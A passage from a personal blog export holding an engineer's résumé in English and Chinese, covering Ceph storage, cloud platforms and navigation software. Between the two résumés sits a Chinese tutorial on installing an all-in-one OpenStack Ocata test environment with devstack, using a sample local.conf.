<h3 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h3><h4 id="eKing-IAAS-Cloud-Platform"><a href="#eKing-IAAS-Cloud-Platform" class="headerlink" title="eKing IAAS Cloud Platform"></a>eKing IAAS Cloud Platform</h4><p><strong>Introduction</strong> ：</p>
<p>Provide private cloud IAAS services for HNA Group.<br>The cloud platform is based on the cloud computing platform as the core, integrating a variety of high-quality cloud products, committed to providing users with integrated cloud services, creating an enterprise-level integrated platform for multi-cloud product integration and cross-data center management, the platform applies the open source cloud platform architecture, based on Xen\VMWare virtualization technology, to ensure the high availability of the cloud platform, and the cloud management platform provides resource management functions such as data center management, cluster management, host management, storage management, network management, template management, and snapshot management. Integrate high-quality resourcesUsers provide a variety of high-quality cloud services, such as cloud servers, load balancing, auto scaling services, cloud disks, data backup, cloud monitoring, and resource expansion. The cloud platform provides VLAN, GRE network isolation technology, and active&#x2F;standby deployment modes to ensure high security and reliability of the platform.</p>
<p><strong>Duty</strong> :</p>
<ol>
<li>Design Distributed Storage Ceph Scheme</li>
<li>Distributed storage Ceph reliability tuning, and performance optimization</li>
<li>Integrate Distributed Storage Ceph RBD with XenServer</li>
</ol>
<p><strong>Code Review</strong></p>
<ul>
<li><a href="https://github.com/zhoubofsy/rbdsr/commits/master/">RBDSR Driver</a></li>
<li><a href="https://github.com/zhoubofsy/RBDSR-1/commits/master/">RBDSR Driver</a></li>
</ul>
<h3 id="Project-1"><a href="#Project-1" class="headerlink" title="Project"></a>Project</h3><h4 id="Relation-Database-Service-RDS"><a href="#Relation-Database-Service-RDS" class="headerlink" title="Relation Database Service (RDS)"></a>Relation Database Service (RDS)</h4><p><strong>Introduction</strong> :</p>
<p>Optimizing an existing database into a cloud environment with MariaDB allows users to use the storage capacity and bandwidth they need, moving the database from one place to another for on-demand scaling and high availability. You can easily apply for and create a database in the RDS console, and the RDS instance can be ready and put into use within a few minutes. You can use the full-featured console provided by RDS to manage all instances in a unified manner. RDS features such as automatic single-point switchover and automatic database backup to ensure high availability and data security. The cost paid by RDS is much lower than the cost of self-built databases, and users can choose different packages according to their needs and get a complete set of professional database support services at a very low price.</p>
<p><strong>Duty</strong> :</p>
<ol>
<li>Cloud database technology research</li>
<li>Cloud database architecture design</li>
<li>Write code for the backend schema of the cloud database</li>
</ol>
<p><strong>Code Review</strong></p>
<ul>
<li><a href="https://github.com/zhoubofsy/RDS">RDS</a></li>
</ul>
<hr>
<h2 id="2014-05-–-2016-03"><a href="#2014-05-–-2016-03" class="headerlink" title="2014&#x2F;05 – 2016&#x2F;03"></a>2014&#x2F;05 – 2016&#x2F;03</h2><h3 id="NEUNN-Technology-Co-Ltd"><a href="#NEUNN-Technology-Co-Ltd" class="headerlink" title="NEUNN Technology Co., Ltd"></a>NEUNN Technology Co., Ltd</h3><p><strong>Position</strong> : Cloud Computing Storage Senior Software Engineer</p>
<p><strong>Description</strong> : </p>
<ul>
<li>Responsible for distributed storage (Ceph) program research and development;</li>
<li>Responsible for distributed storage Ceph secondary development and depth customization;</li>
</ul>
<h3 id="Project-2"><a href="#Project-2" class="headerlink" title="Project"></a>Project</h3><h4 id="NEUNN-Cloud-Platform"><a href="#NEUNN-Cloud-Platform" class="headerlink" title="NEUNN Cloud Platform"></a>NEUNN Cloud Platform</h4><p><strong>Introduction</strong> :</p>
<ol>
<li>Provide fast stack for openstack</li>
<li>Provide object storage service (radosgw)</li>
</ol>
<p><strong>Duty</strong> :</p>
<ol>
<li>ceph deployment plan design</li>
<li>ceph reliability tuning, performance optimization</li>
<li>radosgw object storage interface development</li>
<li>librados code analysis</li>
<li>cursh code analysis</li>
</ol>
<hr>
<h2 id="2012-07-–-2014-04"><a href="#2012-07-–-2014-04" class="headerlink" title="2012&#x2F;07 – 2014&#x2F;04"></a>2012&#x2F;07 – 2014&#x2F;04</h2><h3 id="Inspur-Beijing-Electronic-Information-Industry-Co-Ltd"><a href="#Inspur-Beijing-Electronic-Information-Industry-Co-Ltd" class="headerlink" title="Inspur (Beijing) Electronic Information Industry Co., Ltd"></a>Inspur (Beijing) Electronic Information Industry Co., Ltd</h3><p><strong>Position</strong> : Senior Software Engineer<br><strong>Description</strong> :</p>
<ul>
<li>Responsible for linux, solaris platform storage virtualization design, coding</li>
</ul>
<h3 id="Project-3"><a href="#Project-3" class="headerlink" title="Project"></a>Project</h3><h4 id="AS1200-dual-controller-storage-virtualization"><a href="#AS1200-dual-controller-storage-virtualization" class="headerlink" title="AS1200 dual controller storage virtualization"></a>AS1200 dual controller storage virtualization</h4><p><strong>Introduction</strong> :<br>Storage virtualization</p>
<p><strong>Time</strong> : 2012&#x2F;07 – 2013&#x2F;06<br><strong>System</strong> : linux, Openindiana<br><strong>Tools</strong> : VIM, GDB, GCC</p>
<p><strong>Duty</strong> :</p>
<ol>
<li>livestor design and coding work;</li>
<li>Openindiana devfs (device file system) principle research;</li>
<li>Openindiana devfsadm command principle research;</li>
<li>Openindiana kernel Bug investigation and modification;</li>
</ol>
<h4 id="HA-High-Availability-Cluster-System"><a href="#HA-High-Availability-Cluster-System" class="headerlink" title="HA(High Availability) Cluster System"></a>HA(High Availability) Cluster System</h4><p><strong>Introduction</strong> :<br>The emergence of highly available clusters is to make the overall service of the cluster as much as possible, thereby to reduce the loss of computer hardware and software error. If a node fails, its standby node will take over its duties in a matter of seconds. Therefore, the cluster will never shut down. The main role of high-availability cluster software is to automate fault checking and service switching.</p>
<p><strong>Time</strong> : 2012&#x2F;07 – 2014&#x2F;04<br><strong>System</strong> : linux、windows2000、windows2003、windows2008、windows2012<br><strong>Tools</strong> : vc6、vs2005、vs2010、vs2012、wdk7、wdk8、gcc、gdb、vim<br><strong>Duty</strong> : </p>
<ol>
<li>LRM (Local Resources Manage) Local Resource Module Design Code</li>
<li>HB heartbeat module design code</li>
<li>HaDsk disk filter driver design code (windows version)</li>
</ol>
<hr>
<h2 id="2010-08-–-2012-04"><a href="#2010-08-–-2012-04" class="headerlink" title="2010&#x2F;08 – 2012&#x2F;04"></a>2010&#x2F;08 – 2012&#x2F;04</h2><h3 id="Beijing-Juli-Technology-Co-Ltd"><a href="#Beijing-Juli-Technology-Co-Ltd" class="headerlink" title="Beijing Juli Technology Co., Ltd"></a>Beijing Juli Technology Co., Ltd</h3><p><strong>Position</strong> : Senior Software Engineer<br><strong>Description</strong> ：</p>
<ul>
<li>Responsible for product demand analysis, architecture design, module design, coding</li>
</ul>
<h3 id="Project-4"><a href="#Project-4" class="headerlink" title="Project"></a>Project</h3><h4 id="Beijing-taxi-new-landmark-vehicle-information-system-——Central-controller"><a href="#Beijing-taxi-new-landmark-vehicle-information-system-——Central-controller" class="headerlink" title="Beijing taxi new landmark vehicle information system ——Central controller"></a>Beijing taxi new landmark vehicle information system ——Central controller</h4><p><strong>Introduction</strong> :<br>Provides hardware support for central controller applications</p>
<ol>
<li>SPI forwards serial data</li>
<li>GPRS connection network</li>
<li>Application self-starting</li>
<li>GPIO control</li>
<li>Self-power control</li>
<li>RTC synchronization</li>
</ol>
<p><strong>Time</strong> : 2011&#x2F;08 – 2012&#x2F;04<br><strong>System</strong> ：WinCE6.0<br><strong>Hardware</strong> ：SirfA4（ARM）<br><strong>Tools</strong> : PlatformBuilder6.0 , VS2005<br><strong>Duty</strong> :</p>
<ol>
<li>Demand analysis</li>
<li>Overall architecture design</li>
<li>SPI forwarding serial data module design, coding and testing</li>
<li>Application self-starting module design, coding and testing</li>
<li>GPIO control module design, coding and testing</li>
<li>Design, coding and testing of self - power control module</li>
<li>wince kernel customization</li>
</ol>
<h4 id="Beijing-Taxi-New-Landmark-Vehicle-Information-System-Meter-TXN-13"><a href="#Beijing-Taxi-New-Landmark-Vehicle-Information-System-Meter-TXN-13" class="headerlink" title="Beijing Taxi New Landmark Vehicle Information System - Meter (TXN-13)"></a>Beijing Taxi New Landmark Vehicle Information System - Meter (TXN-13)</h4><p><strong>Introduction</strong> :<br>Provide pricing, entertainment, telephone, navigation, call car and other services for taxi driver</p>
<ol>
<li>Pricing function</li>
<li>Entertainment function (audio file and video file playback)</li>
<li>To achieve the center shunting, calling the car, making phone calls, navigation and other auxiliary functions</li>
</ol>
<p><strong>Time</strong> : 2010&#x2F;08 – 2012&#x2F;04<br><strong>System</strong> : wince6.0、windows xp<br><strong>Hardware</strong> ：SirfA4 , x86<br><strong>Tools</strong> : vs2005<br><strong>Duty</strong> :</p>
<ol>
<li>Demand analysis</li>
<li>Overall architecture design</li>
<li>Pricing module design, coding and testing</li>
<li>Multimedia module design, coding and testing</li>
<li>Taxi multifunctional business module design, coding and testing</li>
</ol>
<hr>
<h2 id="2007-10-–-2010-04"><a href="#2007-10-–-2010-04" class="headerlink" title="2007&#x2F;10 – 2010&#x2F;04"></a>2007&#x2F;10 – 2010&#x2F;04</h2><h3 id="Shenyang-Meixing-Science-and-Technology-Co-Ltd"><a href="#Shenyang-Meixing-Science-and-Technology-Co-Ltd" class="headerlink" title="Shenyang Meixing Science and Technology Co., Ltd"></a>Shenyang Meixing Science and Technology Co., Ltd</h3><p><strong>Position</strong> : Software Engineer<br><strong>Description</strong> : </p>
<ul>
<li>Responsible for module design, coding, testing</li>
</ul>
<h3 id="Project-5"><a href="#Project-5" class="headerlink" title="Project"></a>Project</h3><h4 id="DaoDaotong-Navigation-System"><a href="#DaoDaotong-Navigation-System" class="headerlink" title="DaoDaotong Navigation System"></a>DaoDaotong Navigation System</h4><p><strong>Introduction</strong> :<br>DaoDaotong navigation is a system to provide customers map browsing, data retrieval, satellite positioning, route guidance, voice prompts, route calculation, real-time traffic and other services</p>
<p><strong>Time</strong> : 2009&#x2F;05 – 2010&#x2F;03<br><strong>System</strong> : Windows CE、windows xp<br><strong>Hardware</strong> : MIPS、ARM、x86<br><strong>Tools</strong> : vs2005<br><strong>Duty</strong> :</p>
<ol>
<li>Design, coding and testing of map drawing data production module</li>
<li>UI part of the design of the page, coding, testing</li>
<li>User data backup and recovery module design, coding, testing</li>
</ol>
<h4 id="Huayang-Iron-General-Navigation-System"><a href="#Huayang-Iron-General-Navigation-System" class="headerlink" title="Huayang &amp; Iron General Navigation System"></a>Huayang &amp; Iron General Navigation System</h4><p><strong>Introduction</strong> :<br>Huayang &amp; Iron General navigation system is a system to provide customers map browsing, data retrieval, satellite positioning, route guidance, voice prompts, route calculation and other services</p>
<p><strong>Time</strong> : 2008&#x2F;10 – 2009&#x2F;03<br><strong>System</strong> : Windows CE、windows xp<br><strong>Hardware</strong> : ARM , MPIS, x86<br><strong>Tools</strong> : vc6.0<br><strong>Duty</strong> :</p>
<ol>
<li>Design, coding and testing of map drawing data production module</li>
<li>UI part of the design of the page, coding, testing</li>
<li>User data backup and recovery module design, coding, testing</li>
</ol>
<h4 id="Ford-Mondeo-Car-Navigation-System"><a href="#Ford-Mondeo-Car-Navigation-System" class="headerlink" title="Ford Mondeo Car Navigation System"></a>Ford Mondeo Car Navigation System</h4><p><strong>Introduction</strong> :<br>Ford Mondeo Car Navigation System (preload) is a system to provide customers map browsing, data retrieval, satellite positioning, route guidance, voice prompts, route calculation and other services</p>
<p><strong>Time</strong> : 2007&#x2F;10 – 2008&#x2F;08<br><strong>System</strong> : Windows CE、windows xp<br><strong>Hardware</strong> : MIPS , x86<br><strong>Tools</strong> : vc6.0<br><strong>Duty</strong> :</p>
<ol>
<li>Design, coding and testing of map drawing data production module</li>
</ol>
<hr>
<h2 id="2006-06-–-2007-05"><a href="#2006-06-–-2007-05" class="headerlink" title="2006&#x2F;06 – 2007&#x2F;05"></a>2006&#x2F;06 – 2007&#x2F;05</h2><h3 id="Project-6"><a href="#Project-6" class="headerlink" title="Project"></a>Project</h3><h4 id="Integrated-Warehouse-Logistics-ERP-System"><a href="#Integrated-Warehouse-Logistics-ERP-System" class="headerlink" title="Integrated Warehouse Logistics ERP System"></a>Integrated Warehouse Logistics ERP System</h4><p><strong>Introduction</strong> :<br>This system is based on the c &#x2F; s model of the logistics information management, which is designed for the logistics enterprise to design information management system (MIS), including the background database establishment and maintenance and front-end application development in two aspects. The system ensures data consistency and integrity of the database security and good library. The application is fully functional and easy to use. Through the need analysis of logistics management information system, division of functional module, and the analysis of database model, the system thus designs the database structure and application program. (To achieve freight management, fund management, return management, return management, system backup, print documents, statistical reports, report inquiries and other functions.</p>
<p><strong>System</strong> : windows2000<br><strong>Hardware</strong> : x86<br><strong>Tools</strong> : PowerBuilder9.0 , SQLServer2000 , VisualSourceSafe<br><strong>Duty</strong> :</p>
<ol>
<li>System requirements analysis</li>
<li>Overall frame design</li>
<li>Database Design</li>
<li>Part of the module design, coding, testing</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>devstack部署</title>
    <url>/2017/07/21/devstack-deploy/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>OpenStack（以下简称OPS）是一个很庞大的系统，想要部署一个OPS需要部署很多组件。想必部署之路也是坑坑奇多。所以为了方便使用OPS，需要部署一个“all-in-one”环境的OPS</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
<li>CPU<br>  2U X86_64</li>
<li>Memory<br>  4G及以上，如果内存过小，会出现各种问题。（整个devstack-Openstack-Ocata + CentOS7.3 1611需要占用3.4G内存）</li>
<li>OS<br>  CentOS 7.3 1611</li>
<li>NET<br>  建议创建两个网络，一个用于连接外网用于做管理性工作；一个供neutron使用</li>
<li>OpenStack版本<br>  Ocata</li>
</ul>
<h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><h4 id="关闭selinux"><a href="#关闭selinux" class="headerlink" title="关闭selinux"></a>关闭selinux</h4><p>编辑<code>/etc/selinux/config</code>将<code>SELINUX=enforcing</code>改为<code>SELINUX=disabled</code></p>
<h4 id="关闭iptables"><a href="#关闭iptables" class="headerlink" title="关闭iptables"></a>关闭iptables</h4><p>执行命令<code>sudo systemctl disable iptables</code>，关闭iptables服务</p>
<p>上诉两处修改若想生效需要重启系统。</p>
<h3 id="安装依赖软件"><a href="#安装依赖软件" class="headerlink" title="安装依赖软件"></a>安装依赖软件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y epel-release git net-tools</span><br></pre></td></tr></table></figure>

<h3 id="下载Devstack"><a href="#下载Devstack" class="headerlink" title="下载Devstack"></a>下载Devstack</h3><p>从github上下载devstack<code>git clone https://github.com/openstack-dev/devstack.git</code>，然后切换版本到Ocata <code>git checkout stable/ocata</code>，可使用<code>git branch -av</code>查看devstack所处分支</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="创建stack用户"><a href="#创建stack用户" class="headerlink" title="创建stack用户"></a>创建stack用户</h3><ol>
<li>进入devstack目录 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd devstack</span><br></pre></td></tr></table></figure></li>
<li>创建stack用户 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ./tools/create-stack-user.sh</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h3><ol>
<li>修改目录owner <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chown -R stack:stack ./devstack</span><br></pre></td></tr></table></figure></li>
<li>修改<code>/opt/stack</code>目录访问权限 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod 777 /opt/stack -R</span><br><span class="line">sudo mv ./devstack /opt/stack/</span><br></pre></td></tr></table></figure></li>
<li>切换用户 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo su - stack</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="撰写local-conf"><a href="#撰写local-conf" class="headerlink" title="撰写local.conf"></a>撰写local.conf</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[[local|localrc]]</span><br><span class="line"></span><br><span class="line">DEST=/opt/stack/ocata</span><br><span class="line"># use TryStack git mirror</span><br><span class="line">GIT_BASE=http://git.trystack.cn</span><br><span class="line">NOVNC_REPO=http://git.trystack.cn/kanaka/noVNC.git</span><br><span class="line">SPICE_REPO=http://git.trystack.cn/git/spice/spice-html5.git</span><br><span class="line"></span><br><span class="line">#OFFLINE=True</span><br><span class="line">RECLONE=False</span><br><span class="line"></span><br><span class="line"># Define images to be automatically downloaded during the DevStack built process.</span><br><span class="line">DOWNLOAD_DEFAULT_IMAGES=False</span><br><span class="line">IMAGE_URLS=&quot;,https://launchpad.net/cirros/trunk/0.3.0/+download/cirros-0.3.0-x86_64-disk.img&quot;</span><br><span class="line"></span><br><span class="line">HOST_IP=127.0.0.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Credentials</span><br><span class="line">DATABASE_PASSWORD=pass</span><br><span class="line">ADMIN_PASSWORD=pass</span><br><span class="line">SERVICE_PASSWORD=pass</span><br><span class="line">SERVICE_TOKEN=pass</span><br><span class="line">RABBIT_PASSWORD=pass</span><br><span class="line"></span><br><span class="line">HORIZON_BRANCH=stable/ocata</span><br><span class="line">KEYSTONE_BRANCH=stable/ocata</span><br><span class="line">NOVA_BRANCH=stable/ocata</span><br><span class="line">NEUTRON_BRANCH=stable/ocata</span><br><span class="line">GLANCE_BRANCH=stable/ocata</span><br><span class="line">CINDER_BRANCH=stable/ocata</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#keystone</span><br><span class="line">KEYSTONE_TOKEN_FORMAT=UUID</span><br><span class="line"></span><br><span class="line">##Heat</span><br><span class="line">HEAT_BRANCH=stable/ocata</span><br><span class="line">enable_service h-eng h-api h-api-cfn h-api-cw</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Swift</span><br><span class="line">SWIFT_BRANCH=stable/ocata</span><br><span class="line">ENABLED_SERVICES+=,s-proxy,s-object,s-container,s-account</span><br><span class="line">SWIFT_REPLICAS=1</span><br><span class="line">SWIFT_HASH=011688b44136573e209e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Enabling Neutron (network) Service</span><br><span class="line">disable_service n-net</span><br><span class="line">enable_service q-svc</span><br><span class="line">enable_service q-agt</span><br><span class="line">enable_service q-dhcp</span><br><span class="line">enable_service q-l3</span><br><span class="line">enable_service q-meta</span><br><span class="line">enable_service q-metering</span><br><span class="line">enable_service neutron</span><br><span class="line"></span><br><span class="line">## Neutron options</span><br><span class="line">Q_USE_SECGROUP=True</span><br><span class="line">FLOATING_RANGE=&quot;192.168.36.0/24&quot;</span><br><span class="line">FIXED_RANGE=&quot;10.0.0.0/24&quot;</span><br><span class="line">Q_FLOATING_ALLOCATION_POOL=start=192.168.36.55,end=192.168.36.100</span><br><span class="line">PUBLIC_NETWORK_GATEWAY=&quot;192.168.36.1&quot;</span><br><span class="line">Q_L3_ENABLED=True</span><br><span class="line">PUBLIC_INTERFACE=eth1</span><br><span class="line">Q_USE_PROVIDERNET_FOR_PUBLIC=True</span><br><span class="line">OVS_PHYSICAL_BRIDGE=br-ex</span><br><span class="line">PUBLIC_BRIDGE=br-ex</span><br><span class="line">OVS_BRIDGE_MAPPINGS=public:br-ex</span><br><span class="line"></span><br><span class="line"># #VLAN configuration.</span><br><span class="line">Q_PLUGIN=ml2</span><br><span class="line">ENABLE_TENANT_VLANS=True</span><br><span class="line"></span><br><span class="line"># Logging</span><br><span class="line">LOGFILE=/opt/stack/logs/stack.sh.log</span><br><span class="line">VERBOSE=True</span><br><span class="line">LOG_COLOR=True</span><br><span class="line">SCREEN_LOGDIR=/opt/stack/logs</span><br></pre></td></tr></table></figure>
<h3 id="安装OPS（all-in-one）"><a href="#安装OPS（all-in-one）" class="headerlink" title="安装OPS（all-in-one）"></a>安装OPS（all-in-one）</h3><p>安装使用<code>stack.sh</code>脚本，卸载使用<code>unstack.sh</code>脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./stack.sh</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">=========================</span><br><span class="line">DevStack Component Timing</span><br><span class="line">=========================</span><br><span class="line">Total runtime         1254</span><br><span class="line"></span><br><span class="line">run_process            83</span><br><span class="line">test_with_retry         4</span><br><span class="line">pip_install           127</span><br><span class="line">restart_apache_server  29</span><br><span class="line">wait_for_service       19</span><br><span class="line">yum_install            50</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">This is your host IP address: 127.0.0.1</span><br><span class="line">This is your host IPv6 address: ::1</span><br><span class="line">Horizon is now available at http://127.0.0.1/dashboard</span><br><span class="line">Keystone is serving at http://127.0.0.1/identity/</span><br><span class="line">The default users are: admin and demo</span><br><span class="line">The password: pass</span><br></pre></td></tr></table></figure>
<p>安装时遇到问题可从两个角度考虑，一个网络不通，一个内存不足。这里再次重申，内存一定要&gt;&#x3D;4G，如果网络不通或延时太大，建议使用国内镜像。</p>
<p>例如<code>/opt/stack/.pip/pip.conf</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line"></span><br><span class="line">timeout = 6000</span><br><span class="line">index-url = http://pypi.douban.com/simple</span><br><span class="line">trusted-host = pypi.douban.com</span><br></pre></td></tr></table></figure>

<h2 id="horizon"><a href="#horizon" class="headerlink" title="horizon"></a>horizon</h2><p>安装成功后，访问<code>http://x.x.x.x/dashboard</code>, 用户民密码见<code>local.conf</code></p>
<p><img src="/images/devstack/horizon_login.png" alt="horizon_login"></p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://blog.csdn.net/lyjshen/article/details/69467444">Virtuabox中Centos 7.3安装devstack后记</a></li>
<li><a href="http://www.fx114.net/qa-7-155510.aspx">Centos7下搭建带有Ceilometer的devstack（mitaka版本）</a></li>
<li><a href="http://blog.csdn.net/scucscheng/article/details/51884613">centos 7 devstack 安装 openstack Mitaka</a></li>
<li><a href="http://www.chenshake.com/devstack-installation-and-testing/">devstack安装和测试</a></li>
</ul>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>devstack</tag>
      </tags>
  </entry>
  <entry>
    <title>工作简历</title>
    <url>/1984/10/10/owlgroup_introduce/</url>
    <content><![CDATA[<h1 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h1><p> 周博 ｜ 男 ｜ 汉族 ｜ 已婚 ｜ 1984年10月10日出生 ｜ 辽宁沈阳人 ｜ 本科学历 </p>
<p> Email: <a href="mailto:&#122;&#x68;&#x6f;&#117;&#98;&#111;&#x66;&#x73;&#121;&#64;&#104;&#x6f;&#x74;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d;">&#122;&#x68;&#x6f;&#117;&#98;&#111;&#x66;&#x73;&#121;&#64;&#104;&#x6f;&#x74;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d;</a> | 电话：13042422560</p>
<h1 id="教育情况"><a href="#教育情况" class="headerlink" title="教育情况"></a>教育情况</h1><p>2003&#x2F;09 ~ 2007&#x2F;07 | 沈阳大学 ｜ 计算机科学与技术 ｜ 本科</p>
<h1 id="技能情况"><a href="#技能情况" class="headerlink" title="技能情况"></a>技能情况</h1><ul>
<li>掌握多种开发语言及脚本，精通C&#x2F;C++、Shell、Python，熟悉golang</li>
<li>能熟练使用ubuntu、debian、centos、archlinux操作系统，熟悉linux内核</li>
<li>精通Linux文件系统、存储框架</li>
<li>精通分布式存储Ceph及其架构</li>
<li>熟悉大数据分布式存储系统HDFS，了解大数据生态环境</li>
<li>熟悉云数据库、虚拟化、容器（daocker）技术</li>
</ul>
<h1 id="工作项目经历"><a href="#工作项目经历" class="headerlink" title="工作项目经历"></a>工作项目经历</h1><h2 id="2016-03-–-Now"><a href="#2016-03-–-Now" class="headerlink" title="2016&#x2F;03 – Now"></a>2016&#x2F;03 – Now</h2><h3 id="海南易建科技股份有限公司"><a href="#海南易建科技股份有限公司" class="headerlink" title="海南易建科技股份有限公司"></a>海南易建科技股份有限公司</h3><p>** 职位 ** : 架构师<br>** 工作描述 **</p>
<ul>
<li>负责分布式存储（Ceph）方案调研及制定；</li>
<li>负责分布式存储Ceph性能优化；</li>
<li>负责分布式存储Ceph与XenServer集成；</li>
<li>负责Docker相关技术调研；</li>
</ul>
<h3 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h3><h4 id="海航云管理平台"><a href="#海航云管理平台" class="headerlink" title="海航云管理平台"></a>海航云管理平台</h4><p>** 项目介绍 ** ：<br>云平台是以云计算平台为核心，集成多种优质云产品，致力为用户提供一体化云服务，打造多云产品集成、跨数据中心管理的企业级综合平台，平台应用开源云平台架构，基于Xen\VMWare虚拟化技术，保障了云平台的高可用性，云管理平台提供数据中心管理、集群管理、宿主机管理、存储管理、网络管理、模板管理、快照管理等资源管理功能。整合优质资源用户提供云服务器、负载均衡、弹性伸缩服务、云盘、数据备份、云监控、资源扩展等多种优质云服务。云平台提供VLAN、GRE网络隔离技术，主备部署模式等，保证了平台的高安全性和高可靠性。</p>
<p>** 责任描述 ** :</p>
<ol>
<li>分布式存储Ceph方案设计</li>
<li>分布式存储Ceph可靠性调优，及性能优化</li>
<li>分布式存储Ceph RBD与XenServer集成</li>
</ol>
<h4 id="云数据库"><a href="#云数据库" class="headerlink" title="云数据库"></a>云数据库</h4><p>** 项目介绍 ** :<br>以MariaDB为依托，将一个现有的数据库优化到云环境中，可以使用户按照存储容量和带宽的需求使用，可以将数据库从一个地方移到另一个地方，可实现按需扩展和高可用性。用户能够在RDS控制台轻松的完成数据库申请和创建，RDS实例在几分钟内就可以准备就绪并投入使用。用户通过RDS提供的功能完善的控制台，对所有实例进行统一管理。RDS具有故障自动单点切换、数据库自动备份等功能，保证RDS实例高可用和数据安全。RDS支付的费用远低于自建数据库所需的成本，用户可以根据自己的需求选择不同套餐，使用很低的价格得到一整套专业的数据库支持服务。</p>
<p>** 责任描述 ** :</p>
<ol>
<li>云数据库技术调研</li>
<li>云数据库架构设计</li>
<li>云数据库后台架构代码编写</li>
</ol>
<hr>
<h2 id="2014-05-–-2016-03"><a href="#2014-05-–-2016-03" class="headerlink" title="2014&#x2F;05 – 2016&#x2F;03"></a>2014&#x2F;05 – 2016&#x2F;03</h2><h3 id="东网科技有限公司"><a href="#东网科技有限公司" class="headerlink" title="东网科技有限公司"></a>东网科技有限公司</h3><p>** 职位 ** : 云计算存储高级软件工程师<br>** 工作描述 ** : </p>
<ul>
<li>负责分布式存储（Ceph）方案调研及制定；</li>
<li>负责分布式存储 Ceph 二次开发及深度定制；</li>
</ul>
<h3 id="项目-1"><a href="#项目-1" class="headerlink" title="项目"></a>项目</h3><h4 id="东网云平台"><a href="#东网云平台" class="headerlink" title="东网云平台"></a>东网云平台</h4><p>** 项目介绍 ** :<br>东网云平台，是一种混合云平台，依托KVM虚拟化技术，在OpenStack基础上构建而成，为客户提供IAAS服务和存储服务</p>
<p>** 责任描述 ** :</p>
<ol>
<li>为openstack提供快设备</li>
<li>提供对象存储服务(radosgw)</li>
<li>ceph部署方案设计</li>
<li>ceph可靠性调优，性能优化</li>
<li>radosgw对象存储接口开发</li>
<li>librados代码分析</li>
<li>cursh代码分析</li>
</ol>
<hr>
<h2 id="2012-07-–-2014-04"><a href="#2012-07-–-2014-04" class="headerlink" title="2012&#x2F;07 – 2014&#x2F;04"></a>2012&#x2F;07 – 2014&#x2F;04</h2><h3 id="浪潮（北京）电子信息产业有限公司"><a href="#浪潮（北京）电子信息产业有限公司" class="headerlink" title="浪潮（北京）电子信息产业有限公司"></a>浪潮（北京）电子信息产业有限公司</h3><p>** 职位 ** : 高级软件工程师<br>** 工作描述 ** :</p>
<ul>
<li>负责linux、solaris平台下存储虚拟化程序设计、编码工作</li>
</ul>
<h3 id="项目-2"><a href="#项目-2" class="headerlink" title="项目"></a>项目</h3><h4 id="AS1200双控制器存储虚拟化"><a href="#AS1200双控制器存储虚拟化" class="headerlink" title="AS1200双控制器存储虚拟化"></a>AS1200双控制器存储虚拟化</h4><p>** 项目介绍 ** :<br>AS1200存储系统，具备NAS、IPSAN、FCSAN功能，提供多级数据保护功能，解决数据存取和业务持续运行问题。支持本地持续数据保护、异地容灾功能，兼备高可靠、高性能、多功能等特性。</p>
<p>** 时间 ** : 2012&#x2F;07 – 2013&#x2F;06<br>** 系统 ** : linux, Solaris(Openindiana)<br>** 工具 ** : VIM, GDB, GCC</p>
<p>** 责任描述 ** :</p>
<ol>
<li>livestor的设计及编码工作；</li>
<li>solaris(Openindiana) devfs（设备文件系统）原理调研；</li>
<li>solaris(Openindiana) devfsadm 命令原理调研；</li>
<li>solaris(Openindiana) 内核Bug调查及修改;</li>
</ol>
<h4 id="高可用集群系统"><a href="#高可用集群系统" class="headerlink" title="高可用集群系统"></a>高可用集群系统</h4><p>** 项目介绍 ** :<br>高可用集群的出现是为了使集群的整体服务尽可能可用，从而减少由计算机硬件和软件易错性所带来的损失。如果某个节点失效，它的备援节点将接管它的职责。因此，对于用户而言，集群永远不会停机。高可用集群软件的主要作用就是实现故障检查和业务切换的自动化。</p>
<p>** 时间 ** : 2012&#x2F;07 – 2014&#x2F;04<br>** 系统 ** : linux、windows2000、windows2003、windows2008、windows2012<br>** 工具 ** : vc6、vs2005、vs2010、vs2012、wdk7、wdk8、gcc、gdb、vim<br>** 责任描述 ** : </p>
<ol>
<li>LRM（Local Resources Manage）本地资源模块设计编码</li>
<li>HB 心跳模块设计编码</li>
